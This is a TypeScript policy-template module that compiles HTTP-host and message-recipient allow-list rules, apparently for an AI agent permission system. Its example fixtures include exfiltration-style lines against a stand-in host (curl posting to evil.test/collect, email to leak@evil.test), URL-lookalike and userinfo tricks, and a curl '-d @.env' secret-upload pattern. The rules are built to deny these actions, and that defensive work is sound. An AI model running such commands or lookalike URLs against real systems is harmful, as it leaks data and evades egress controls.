// Template network-egress (Q06 outbound HTTP host allow-list, Q07 message recipient domain allow-list; free text: a host
// or domain to block). RUBRIC §3 Q06/Q07.
//   - Q06 applies to http actions and to the recognised HTTP clients (curl, wget; PowerShell Invoke-WebRequest/iwr,
//     Invoke-RestMethod/irm in M5). Package managers and git are not egress actions for this policy.
//   - exact entries match only themselves; `*.x` matches one or more extra labels, never the apex `x`;
//   - userinfo → ask ("userinfo present"), while the parsed host is still checked (a disallowed host denies);
//   - Q07: every recipient is checked; a disallowed domain denies; a recipient without a domain or with an ambiguous
//     form asks; a webhook's URL host must equal an allowed domain; webhook userinfo asks;
//   - enabled with an empty list = deny every destination (PLAN A8), never "no restriction".
// Framework-free.
import { type Rule, MESSAGE_CHANNELS } from '../action';
import type { EvaluationContext } from '../context';
import { instantiateGlob } from '../glob';
import { joinContextPath } from '../normalise/path';
import { hostInList } from '../normalise/url';
import type { Answers } from '../questionnaire';
import {
  type AnswerOutcome,
  cleanList,
  type CompiledRule,
  type FreeTextParams,
  fsAction,
  httpGet,
  message,
  permitted,
  type PolicyTemplate,
  prohibited,
  sh,
  slug,
} from './common';

const TEMPLATE = 'network-egress' as const;

export const EGRESS_FIELDS = {
  'http.host': ['host_not_in', 'glob', 'in'],
  'http.userinfo': ['eq'],
  'message.channel': ['in'],
  'message.domain': ['host_not_in', 'glob'],
  'message.domain_status': ['eq', 'in'],
  'message.userinfo': ['eq'],
} as const;

/** A concrete host for an allow-list entry (`*.cdn.example.test` → `assets.cdn.example.test`). */
function concreteHost(entry: string): string {
  return entry.startsWith('*.') ? `assets${entry.slice(1)}` : instantiateGlob(entry, 'assets');
}

/** Prefer an exact entry for examples: lookalike tricks read most clearly on an exact host. */
function exampleHost(entries: readonly string[]): string {
  const exact = entries.find((entry) => !entry.includes('*'));
  return concreteHost(exact ?? entries[0] ?? 'api.example.test');
}

function readme(context: EvaluationContext): string {
  return joinContextPath(context, context.project_root, 'README.md');
}

function q06Rules(hosts: readonly string[], context: EvaluationContext): CompiledRule[] {
  if (hosts.length === 0) {
    return [
      {
        rule: {
          id: 'q06-deny-all-http',
          source_answer: 'Q06',
          template: TEMPLATE,
          effect: 'deny',
          match: [{ op: 'host_not_in', field: 'http.host', hosts: [] }],
          intent: 'Outbound HTTP is restricted to an empty allow-list: deny every destination.',
        },
        parameters: [],
        examples: [
          prohibited('p1', httpGet('https://evil.test/'), 'deny', 'Any host is denied.'),
          prohibited('p2', sh('curl -s https://api.example.test/v1/health'), 'deny', 'curl to any host is denied.'),
          permitted('n1', sh('echo https://evil.test/'), 'A URL as data is not a request.', 'near-miss-permitted'),
          permitted('n2', fsAction('read', readme(context)), 'An unrelated action.'),
        ],
      },
    ];
  }
  const host = exampleHost(hosts);
  const wildcard = hosts.find((entry) => entry.startsWith('*.'));
  const hostRule: CompiledRule = {
    rule: {
      id: 'q06-host-not-allowed',
      source_answer: 'Q06',
      template: TEMPLATE,
      effect: 'deny',
      match: [{ op: 'host_not_in', field: 'http.host', hosts: [...hosts] }],
      intent: `Only send HTTP requests to ${hosts.join(', ')}.`,
    },
    parameters: [],
    examples: [
      prohibited('p1', httpGet(`https://${host}.evil.test/v1/users`), 'deny', 'The allowed host as a prefix of another host.', 'url-lookalike'),
      prohibited('p2', httpGet(`https://${host}@evil.test/`), 'deny', 'Userinfo spelling the allowed host; the real host is evil.test.', 'url-lookalike'),
      prohibited('p3', sh('curl -s https://evil.test/collect -d x=1'), 'deny', 'curl is a recognised HTTP client.'),
      ...(wildcard !== undefined
        ? [prohibited('p4', httpGet(`https://${wildcard.slice(2)}/`), 'deny', '`*.x` never matches the apex x.')]
        : []),
      permitted('n1', httpGet(`https://${host}/v1/health`), 'Allowed host.'),
      permitted('n2', httpGet(`https://${host.toUpperCase()}/v1/items`), 'Hostnames are lower-cased.', 'case-fold'),
      permitted('n3', httpGet(`https://${host}/search?q=evil.test`), 'A foreign host only in the query.', 'url-lookalike'),
      permitted('n4', sh(`curl -s https://${host}/v1/health`), 'curl to an allowed host.'),
    ],
  };
  const userinfoRule: CompiledRule = {
    rule: {
      id: 'q06-userinfo',
      source_answer: 'Q06',
      template: TEMPLATE,
      effect: 'ask',
      match: [{ op: 'eq', field: 'http.userinfo', value: true }],
      intent: 'Ask before any HTTP request whose URL carries userinfo (user@host).',
    },
    parameters: [],
    examples: [
      prohibited('p1', httpGet(`https://deploy@${host}/v1/status`), 'ask', 'Userinfo present.', 'url-lookalike'),
      prohibited('p2', sh(`curl -s https://ci@${host}/v1/status`), 'ask', 'Userinfo in a curl URL.', 'url-lookalike'),
      permitted('n1', httpGet(`https://${host}/v1/status`), 'No userinfo.'),
      permitted('n2', httpGet(`https://${host}/v1/status#@evil.test`), '"@" only in the fragment is not userinfo.', 'url-lookalike'),
    ],
  };
  return [hostRule, userinfoRule];
}

function q07Rules(domains: readonly string[]): CompiledRule[] {
  if (domains.length === 0) {
    return [
      {
        rule: {
          id: 'q07-deny-all-messages',
          source_answer: 'Q07',
          template: TEMPLATE,
          effect: 'deny',
          match: [{ op: 'in', field: 'message.channel', values: [...MESSAGE_CHANNELS] }],
          intent: 'Message recipients are restricted to an empty allow-list: deny every recipient.',
        },
        parameters: [],
        examples: [
          prohibited('p1', message('email', 'ops@example.test'), 'deny', 'Every recipient is denied.'),
          prohibited('p2', message('sms', '+15550100123'), 'deny', 'Every channel is denied.'),
          permitted('n1', sh('echo "mail ops@example.test"'), 'An address as data is not a message.', 'near-miss-permitted'),
          permitted('n2', httpGet('https://api.example.test/v1/health'), 'An HTTP request is not a message (Q06 governs it).'),
        ],
      },
    ];
  }
  const domain = exampleHost(domains);
  return [
    {
      rule: {
        id: 'q07-domain-not-allowed',
        source_answer: 'Q07',
        template: TEMPLATE,
        effect: 'deny',
        match: [
          { op: 'eq', field: 'message.domain_status', value: 'domain' },
          { op: 'host_not_in', field: 'message.domain', hosts: [...domains] },
        ],
        intent: `Only send messages to recipients at ${domains.join(', ')}.`,
      },
      parameters: [],
      examples: [
        prohibited('p1', message('email', 'alerts@evil.test'), 'deny', 'Disallowed domain.'),
        prohibited('p2', message('email', `ops@mail.${domain}`), 'deny', 'Domains compare exactly: a subdomain is not allowed.'),
        prohibited('p3', message('webhook', 'https://evil.test/hook'), 'deny', 'Webhook host is not an allowed domain.'),
        prohibited('p4', message('email', `ops@${domain}, leak@evil.test`), 'deny', 'One disallowed recipient decides.', 'chained'),
        permitted('n1', message('email', `ops@${domain}`), 'Allowed domain.'),
        permitted('n2', message('email', `Release-Bot@${domain.toUpperCase()}`), 'Domains compare case-insensitively.', 'case-fold'),
        permitted('n3', message('webhook', `https://${domain}/hooks/build`), 'Webhook to an allowed domain.'),
      ],
    },
    {
      rule: {
        id: 'q07-recipient-unverifiable',
        source_answer: 'Q07',
        template: TEMPLATE,
        effect: 'ask',
        match: [{ op: 'in', field: 'message.domain_status', values: ['none', 'ambiguous'] }],
        intent: 'Ask before messaging a recipient whose domain cannot be verified.',
      },
      parameters: [],
      examples: [
        prohibited('p1', message('sms', '+15550100123'), 'ask', 'A phone number has no domain.'),
        prohibited('p2', message('slack', '#incident-room'), 'ask', 'A channel name has no domain.'),
        prohibited('p3', message('email', `ops@evil.test@${domain}`), 'ask', 'More than one "@" is ambiguous.', 'url-lookalike'),
        permitted('n1', message('email', `ops@${domain}`), 'A verifiable recipient.'),
        permitted('n2', message('email', `ops@${domain}, dev@${domain}`), 'Every recipient verifiable.'),
      ],
    },
    {
      rule: {
        id: 'q07-webhook-userinfo',
        source_answer: 'Q07',
        template: TEMPLATE,
        effect: 'ask',
        match: [{ op: 'eq', field: 'message.userinfo', value: true }],
        intent: 'Ask before calling a webhook whose URL carries userinfo.',
      },
      parameters: [],
      examples: [
        prohibited('p1', message('webhook', `https://ci@${domain}/hooks/build`), 'ask', 'Userinfo present.', 'url-lookalike'),
        prohibited('p2', message('webhook', `https://bot@${domain}/hooks/deploy`), 'ask', 'Userinfo present.', 'url-lookalike'),
        permitted('n1', message('webhook', `https://${domain}/hooks/build`), 'No userinfo.'),
        permitted('n2', message('email', `ci@${domain}`), 'An email address is not webhook userinfo.', 'near-miss-permitted'),
      ],
    },
  ];
}

function compile(answers: Answers, context: EvaluationContext): readonly AnswerOutcome[] {
  const hosts = cleanList(answers.Q06.hosts, true);
  const domains = cleanList(answers.Q07.domains, true);
  const q06: AnswerOutcome = answers.Q06.enabled
    ? {
        source_answer: 'Q06',
        disposition: 'restricted',
        rules: q06Rules(hosts, context),
        witnesses: [],
        reason: hosts.length === 0 ? 'Enabled with an empty allow-list: every HTTP destination is denied.' : 'HTTP is limited to the allow-list.',
      }
    : {
        source_answer: 'Q06',
        disposition: 'not-restricted',
        rules: [],
        witnesses: [
          permitted('w1', httpGet('https://evil.test/collect'), 'Q06 off: any host is allowed.'),
          permitted('w2', sh('curl -s https://evil.test/collect'), 'Q06 off: curl to any host is allowed.'),
        ],
        reason: 'The allow-list is switched off.',
      };
  const q07: AnswerOutcome = answers.Q07.enabled
    ? {
        source_answer: 'Q07',
        disposition: 'restricted',
        rules: q07Rules(domains),
        witnesses: [],
        reason: domains.length === 0 ? 'Enabled with an empty allow-list: every recipient is denied.' : 'Recipients are limited to the allow-list.',
      }
    : {
        source_answer: 'Q07',
        disposition: 'not-restricted',
        rules: [],
        witnesses: [
          permitted('w1', message('email', 'alerts@evil.test'), 'Q07 off: any recipient is allowed.'),
          permitted('w2', message('sms', '+15550100123'), 'Q07 off: unverifiable recipients are allowed.'),
        ],
        reason: 'The allow-list is switched off.',
      };
  return [q06, q07];
}

function compileFreeText(id: string, text: string, params: FreeTextParams, context: EvaluationContext): CompiledRule | null {
  if (params.polarity !== 'allow-list' && params.polarity !== 'block-list') return null;
  const allowList = params.polarity === 'allow-list';
  const hosts = cleanList([...(params.hosts ?? []), ...(params.host === undefined ? [] : [params.host])], true);
  if (hosts.length > 0) {
    const host = concreteHost(hosts[0] ?? 'evil.test');
    const outsiders: string[] = [];
    for (let n = 0; outsiders.length < 2 && n < hosts.length + 2; n += 1) {
      const candidate = `policy-witness-${n}.test`;
      if (!hostInList(candidate, hosts)) outsiders.push(candidate);
    }
    const outside = outsiders[0]; const secondOutside = outsiders[1];
    if (outside === undefined || secondOutside === undefined) return null;
    const rule: Rule = {
      id: `ft-${slug(id)}-host`,
      source_answer: `freetext:${id}`,
      template: TEMPLATE,
      effect: 'deny',
      match: [{ op: 'host_not_in', field: 'http.host', hosts, ...(allowList ? {} : { negate: true }) }],
      intent: `${allowList ? 'Only' : 'Never'} send HTTP requests to ${hosts.join(', ')} (free text: ${text}).`,
    };
    return {
      rule,
      parameters: [],
      examples: [
        prohibited('p1', httpGet(`https://${allowList ? outside : host}/`), 'deny', 'Destination violates the declared polarity.'),
        prohibited('p2', httpGet(`https://${allowList ? secondOutside : host.toUpperCase()}/x`), 'deny', 'A second prohibited request.', 'case-fold'),
        permitted('n1', httpGet(`https://${allowList ? host : outside}/?next=${host}`), 'Destination satisfies the declared polarity.', 'url-lookalike'),
        permitted('n2', fsAction('read', readme(context)), 'An unrelated action.'),
      ],
    };
  }
  const domain = params.domain?.trim().toLowerCase();
  if (domain !== undefined && domain.length > 0) {
    // An allow-list needs an additional unverifiable-recipient rule. This single-rule API cannot drop it.
    if (allowList) return null;
    const concrete = concreteHost(domain);
    const outside = hostInList('other.example.test', [domain]) ? 'other.policy-witness.test' : 'other.example.test';
    const rule: Rule = {
      id: `ft-${slug(id)}-domain`,
      source_answer: `freetext:${id}`,
      template: TEMPLATE,
      effect: 'deny',
      match: [{ op: 'eq', field: 'message.domain_status', value: 'domain' }, { op: 'host_not_in', field: 'message.domain', hosts: [domain], negate: true }],
      intent: `Never message recipients at ${domain} (free text: ${text}).`,
    };
    return {
      rule,
      parameters: [],
      examples: [
        prohibited('p1', message('email', `ops@${concrete}`), 'deny', 'The blocked domain.'),
        prohibited('p2', message('email', `OPS@${concrete.toUpperCase()}`), 'deny', 'Case-folded domain.', 'case-fold'),
        permitted('n1', message('email', `ops@${outside}`), 'Another domain.'),
        permitted('n2', message('sms', '+15550100123'), 'No domain: this block-list does not restrict it.'),
      ],
    };
  }
  return null;
}

export const networkEgressTemplate: PolicyTemplate = {
  id: TEMPLATE,
  title: 'Network egress and recipients',
  answers: ['Q06', 'Q07'],
  fields: EGRESS_FIELDS,
  conflicts: [
    { owner_template: 'network-egress', effect: 'deny', reason: 'A userinfo near-miss or a webhook near-miss to a host outside the Q06/Q07 allow-list is denied by the sibling allow-list rule.' },
    { owner_template: 'network-egress', effect: 'ask', reason: 'A permitted request to an allowed host may carry userinfo (q06-userinfo / q07-webhook-userinfo).' },
    { owner_template: 'secrets-paths', effect: 'deny', reason: 'A permitted curl/wget command may read or write a secret file (-d @.env, -o .env).' },
    { owner_template: 'destructive-shell-fs', effect: 'deny', reason: 'A permitted curl/wget command may write outside the root (-o, wget default output).' },
  ],
  compile,
  compileFreeText,
};
